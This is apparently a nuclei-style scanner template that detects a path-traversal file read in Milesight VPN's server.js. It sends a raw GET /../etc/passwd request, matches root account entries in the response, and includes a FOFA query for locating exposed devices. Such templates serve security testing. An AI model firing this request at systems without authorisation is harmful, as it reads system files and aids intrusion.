http:
    - matchers:
        - status:
            - 200
          type: status
        - part: body
          regex:
            - 'root:.*?:[0-9]*:[0-9]*:'
          type: regex
      matchers-condition: and
      raw:
        - |
          GET /../etc/passwd HTTP/1.1
          Host: {{Hostname}}
id: milesight-vpn-serverjs-fileread
info:
    author: zan8in
    description: |
        FOFA: app="Milesight-VPN"
    name: Milesight VPN server.js 任意文件读取漏洞
    severity: high
    tags:
        - milesight
        - fileread
        - Milesight-VPN
